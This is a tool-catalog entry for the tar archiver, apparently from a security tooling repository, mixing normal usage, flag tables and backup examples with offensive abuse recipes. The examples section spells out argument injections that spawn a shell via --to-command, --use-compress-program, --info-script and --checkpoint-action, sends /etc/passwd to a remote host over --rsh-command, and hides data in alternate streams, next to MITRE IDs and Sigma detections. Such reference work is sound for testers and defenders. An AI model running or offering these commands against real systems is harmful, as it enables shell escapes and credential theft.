---
id: system-archive-tar
namespace: system:archive:tar
name: tar
description: Tape archive utility for creating, extracting, and manipulating archive
  files.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - filesystem.archive.compress
  - filesystem.archive.list
  - filesystem.archive.extract
  - filesystem.archive.incremental
  - filesystem.archive.create
  - network.transfer.download
  - network.transfer.upload
  - security.execution.command
  - security.privilege-escalation.shell
  - system.file.read
platforms:
  - linux
  - macos
  - cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies:
  - gzip
  - bzip2
  - xz
related_tools:
  - zip
  - rsync
  - cpio
artifacts:
  - type: filesystem.archive.tar
    description: Tape archive file (compressed or uncompressed)
    mime: application/x-tar
    schema_version: "1.0.0"
    trust_level: verified
  - type: filesystem.directory.contents
    description: Files extracted from an archive
    trust_level: verified
workflow_edges:
  produces:
    - tar-archive
  consumes:
    - filesystem-input
contract:
  inputs:
    - type: filesystem.directory.contents
      description: Input files/directories to archive
    - type: filesystem.archive.tar
      description: Existing tar archive for extraction
  outputs:
    - type: filesystem.archive.tar
      description: Created tar archive
      mime: application/x-tar
    - type: filesystem.directory.contents
      description: Extracted files from archive
  side_effects:
    - filesystem_write
  resource_cost:
    cpu: medium
    memory_mb: 128
    network: low
    disk_io: high
resource_profile:
  cpu: medium
  memory_mb: 128
  network: low
  disk_io: high
allowed-tools:
  - tar
  - Bash
  - execFile
parameters:
  - name: catenate
    type: string
    required: false
    description: "append tar files to an archive"
    aliases:
      - -A
      - --catenate
      - --concatenate
  - name: create
    type: string
    required: false
    description: "create a new archive"
    aliases:
      - -c
      - --create
  - name: delete
    type: string
    required: false
    description: "delete from the archive (not on mag tapes!)"
    aliases:
      - --delete
  - name: diff
    type: string
    required: false
    description: "find differences between archive and file system"
    aliases:
      - -d
      - --diff
      - --compare
  - name: append
    type: string
    required: false
    description: "append files to the end of an archive"
    aliases:
      - -r
      - --append
  - name: test-label
    type: string
    required: false
    description: "test the archive volume label and exit"
    aliases:
      - --test-label
  - name: list
    type: string
    required: false
    description: "list the contents of an archive"
    aliases:
      - -t
      - --list
  - name: update
    type: string
    required: false
    description: "only append files newer than copy in archive"
    aliases:
      - -u
      - --update
  - name: extract
    type: string
    required: false
    description: "extract files from an archive"
    aliases:
      - -x
      - --extract
      - --get
  - name: check-device
    type: string
    required: false
    description: "check device numbers when creating incremental"
    aliases:
      - --check-device
  - name: listed-incremental
    type: file
    required: false
    description: "handle new GNU-format incremental backup"
    aliases:
      - -g
      - --listed-incremental
  - name: incremental
    type: string
    required: false
    description: "handle old GNU-format incremental backup"
    aliases:
      - -G
      - --incremental
  - name: hole-detection
    type: string
    required: false
    description: "--ignore-failed-read do not exit with nonzero on unreadable files
      --level=NUMBER dump level for created listed-incremental archive --no-check-device
      do not check device numbers when creating increm..."
    aliases:
      - --hole-detection
  - name: seek
    type: string
    required: false
    description: "archive is seekable"
    aliases:
      - -n
      - --seek
  - name: occurrence
    type: array
    required: false
    description: "in the archive; this option is valid only in conjunction with one
      of the subcommands --delete, --diff, --extract or --list and when a list of
      files is given either on the command line or via the -T..."
    aliases:
      - --occurrence
  - name: sparse
    type: string
    required: false
    description: "handle sparse files efficiently"
    aliases:
      - -S
      - --sparse
  - name: add-file
    type: file
    required: false
    description: "add given FILE to the archive (useful if its name"
    aliases:
      - --add-file
  - name: directory
    type: file
    required: false
    description: "change to directory DIR"
    aliases:
      - -C
      - --directory
  - name: exclude
    type: string
    required: false
    description: "exclude files, given as a PATTERN"
    aliases:
      - --exclude
  - name: exclude-backups
    type: string
    required: false
    description: "exclude backup and lock files"
    aliases:
      - --exclude-backups
  - name: exclude-caches
    type: string
    required: false
    description: "exclude contents of directories containing"
    aliases:
      - --exclude-caches
  - name: exclude-caches-all
    type: string
    required: false
    description: "exclude directories containing CACHEDIR.TAG"
    aliases:
      - --exclude-caches-all
  - name: exclude-caches-under
    type: file
    required: false
    description: "CACHEDIR.TAG --exclude-ignore=FILE read exclude patterns for each
      directory from FILE, if it exists --exclude-ignore-recursive=FILE read exclude
      patterns for each directory and its subdirectories f..."
    aliases:
      - --exclude-caches-under
  - name: files-from
    type: file
    required: false
    description: "get names to extract or create from FILE"
    aliases:
      - -T
      - --files-from
  - name: unquote
    type: file
    required: false
    description: "unquote input file or member names (default)"
    aliases:
      - --unquote
  - name: verbatim-files-from
    type: string
    required: false
    description: "handling)"
    aliases:
      - -T
      - --verbatim-files-from
  - name: exclude-from
    type: file
    required: false
    description: "exclude patterns listed in FILE"
    aliases:
      - -X
      - --exclude-from
  - name: anchored
    type: string
    required: false
    description: "patterns match file name start"
    aliases:
      - --anchored
  - name: ignore-case
    type: string
    required: false
    description: "ignore case"
    aliases:
      - --ignore-case
  - name: no-anchored
    type: string
    required: false
    description: "patterns match after any '/' (default for"
    aliases:
      - --no-anchored
  - name: checkpoint
    description: Execute command at checkpoint during archive creation (GTFO abuse)
    type: string
  - name: checkpoint-action
    description: Action to execute at checkpoint (e.g., exec=command)
    type: string
  - name: use-compress-program
    description: External compression program (abuse for shell/file-read)
    type: string
  - name: to-command
    description: Pipe extracted files to a command
    type: string
  - name: rsh-command
    description: Remote shell command for SSH-based archive transfer
    type: string
  - name: record-size
    description: Set record size for tape operations
    type: string
  - name: info-script
    description: Run script at volume rotation
    type: string
  - name: new-volume-script
    description: Alias for info-script
    type: string
execution:
  template: "tar {catenate} {create} {delete} {diff} {append}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
  env:
    GZIP: "--no-name"
examples:
  - description: "Create a gzip-compressed archive"
    command: "tar -czvf archive.tar.gz /path/to/directory"
  - description: "Extract an archive to current directory"
    command: "tar -xzvf archive.tar.gz"
  - description: "List contents of an archive without extracting"
    command: "tar -tzvf archive.tar.gz"
  - description: "Create encrypted split archive"
    command: "tar -czvf - /sensitive | openssl enc -aes-256-cbc -out backup.tar.gz.enc"
  - description: The --to-command is normally used to pipe extracted files to a command.
      This can be used to run arbitrary commands on a host. The file must be a valid
      archive file.
    command: "tar xf /tmp/valid.tar --to-command='/bin/sh -c \"sh <&2 1>&2\"'\n"
  - description: Similar to the above, but at a previous stage in the extraction.
      A valid archive is not required. This functionality can be abused in various
      ways for file-read and file-write (see below).
    command: "tar xf /dev/null --use-compress-program='/bin/sh -c \"sh <&2 1>&2\"\
      '\n"
  - description: GNU tar specifc. The -F / --info-script= / --new-volume-script= arguments
      will run a command at volume rotation. Other flags used are to force frequent
      rotation.
    command: "tar cf /dev/null --record-size=512 -L1 -F'/bin/sh -c \"sh <&2 1>&2\"\
      ' /tmp/\n"
  - description: During archive creation, `--checkpoint` and `--checkpoint-action`
      can execute arbitrary commands. Requires injecting two arguments and a positional
      argument.
    command: "tar '--checkpoint=1' '--checkpoint-action=exec=\"sh shell.sh\"'\n"
  - description: This only works for GNU tar. Create tar archive and send it via SSH
      to a remote location. The attacker box must have the `rmt` utility installed
      (it should be present by default in Debian-like distributions).
    command: "tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd
      --rsh-command=/bin/ssh\n"
  - description: Can be used to evade defensive countermeasures, or to hide as part
      of a persistence mechanism
    command: tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}
  - description: Can be used to evade defensive countermeasures, or to hide as part
      of a persistence mechanism
    command: tar -xf {PATH}:ads
  - description: Copy files
    command: tar -xf {PATH_SMB:.tar}
  - description: 'Argument injection: spawn interactive shell: The --to-command is
      normally used to pipe extracted files to a command. This can be used to run
      arbitrary commands on a host. The file must be a valid archive file.'
    command: tar xf /tmp/valid.tar --to-command='/bin/sh -c "sh <&2 1>&2"'
  - description: 'Argument injection: spawn interactive shell: Similar to the above,
      but at a previous stage in the extraction. A valid archive is not required.
      This functionality can be abused in various ways for file-read and file-write
      (see below).'
    command: tar xf /dev/null --use-compress-program='/bin/sh -c "sh <&2 1>&2"'
  - description: 'Argument injection: spawn interactive shell: GNU tar specifc. The
      -F / --info-script= / --new-volume-script= arguments will run a command at volume
      rotation. Other flags used are to force frequent rotation.'
    command: tar cf /dev/null --record-size=512 -L1 -F'/bin/sh -c "sh <&2 1>&2"' /tmp/
  - description: 'Argument injection: execute arbitrary command: During archive creation,
      `--checkpoint` and `--checkpoint-action` can execute arbitrary commands. Requires
      injecting two arguments and a positional argument.'
    command: tar '--checkpoint=1' '--checkpoint-action=exec="sh shell.sh"'
  - description: 'Argument injection: upload file: This only works for GNU tar. Create
      tar archive and send it via SSH to a remote location. The attacker box must
      have the `rmt` utility installed (it should be present by default in Debian-like
      distributions).'
    command: tar cvf remote_user@remote_host.com:/tmp/remote_file.tar /etc/passwd
      --rsh-command=/bin/ssh
  - description: 'Argument injection: download file: GNU tar has remote archive capabilities,
      which can be used to download and extract remote archives. The remote machine
      should have the `rmt` utility installed and configured.'
    command: tar xvf remote_user@remote_host.com:/tmp/remote_file --rsh-command=/bin/ssh
  - description: 'Argument injection: read local file: The --use-compress-program
      flag can be abused to read files.'
    command: tar xf /etc/passwd --use-compress-program='/bin/sh -c "echo hello > /tmp/file"'
  - description: "An approach to backing up the current user's HOME, using tar(1)
      and Gzip compression. Permissions (modes) will be preserved. The filename format
      will be: UID:GID_DATE.tgz Replace 'DEVICE' with whichever device is applicable
      to you, but note that it must be in the '/media/USER' (where USER is the username)
      directory, else this won't work, unless you edit the formatting section of `printf`."
    command: tar -czvpf "$(printf '/media/%s/%s/%d:%d_%(%F)T.tgz' "$USER" 'DEVICE'
      ${UID:-`id -u`} ${GID:-`id -g`} -1)" "$HOME"
  - description: Delete file 'xdm' from the archive given to the `-f` flag. This only
      works on non-compressed archives, unfortunately, but those can always be uncompressed
      first, then altered with the `--delete` flag, after which you can recompress.
    command: tar --delete -f xdm_edited.tar.gz xdm
  - description: Extract the contents of the given archive (which is not compressed)
      to the destination given to the `-C` flag; not many seem to know of this flag.
      If a destination (path given to `-C`) is not provided, the CWD will be used.
    command: tar -C /mnt -xvf Tarball.tar
references:
  - label: "GNU tar manual"
    url: "https://www.gnu.org/software/tar/manual/"
  - label: "POSIX tar specification"
    url: "https://pubs.opengroup.org/onlinepubs/9699919799/utilities/tar.html"
mitre_ids:
  - T1105
  - T1564.004
contributor: Brian Lucero
phase: enumeration
features:
  - output-json
  - network-intensive
  - file-system
  - process-manip
techniques:
  - defense-evasion
  - collection
  - execution
  - exfiltration
  - privilege-escalation
detections:
  - type: sigma
    url: 
      https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_tar_compression.yml
  - type: sigma
    url: 
      https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_tar_extraction.yml
  - type: ioc
    description: tar.exe extracting files from a remote host within the environment
  - type: ioc
    description: Abnormal processes spawning tar.exe
  - type: ioc
    description: tar.exe interacting with alternate data streams (ADS)
---

# tar — Tape Archive Utility

tar is the standard Unix archiving utility that combines multiple files into a single archive file while preserving file system metadata including permissions, ownership, timestamps, and directory structure.

## Operation Flags

| Operation  | Short Flag | Long Flag        | Description                       |
|------------|------------|------------------|-----------------------------------|
| Create     | `-c`       | `--create`       | Create a new archive              |
| Extract    | `-x`       | `--extract`      | Extract from an archive           |
| List       | `-t`       | `--list`         | List archive contents             |
| Append     | `-r`       | `--append`       | Append files to an archive        |
| Delete     | `-D`       | `--delete`       | Delete from archive (non-tape)    |
| Diff       | `-d`       | `--diff`         | Compare archive to filesystem     |

## Compression Mappings

| Format  | Flag | Extension  | Speed vs Ratio      |
|---------|------|------------|---------------------|
| None    | (none) | `.tar`    | Fastest, largest    |
| Gzip    | `-z`  | `.tar.gz` | Fast, moderate      |
| Bzip2   | `-j`  | `.tar.bz2`| Moderate, good      |
| XZ      | `-J`  | `.tar.xz` | Slow, best          |
| Zstandard | `--zstd` | `.tar.zst` | Very fast, good |

## Advanced Patterns

### Incremental Backups

```bash
# Create snapshot metadata
tar -cvf archive.tar -g snapshot.txt /data

# Incremental backup using snapshot
tar -cvf archive-2.tar -g snapshot.txt /data
```

### Streaming Over SSH

```bash
# Send archive directly to remote host
tar -czvf - /local/path | ssh user@remote "tar -xzvf - -C /remote/path"
```

### Excluding Patterns

```bash
# Exclude node_modules and .git directories
tar -czvf project.tar.gz --exclude='node_modules' --exclude='.git' /project
```

## Related Tools

- **[gzip](../../compression/gzip.md)** — Individual file compression
- **[rsync](../../file/rsync.md)** — Synchronization and incremental transfer
- **[zip](../../archive/zip.md)** — Cross-platform archive format
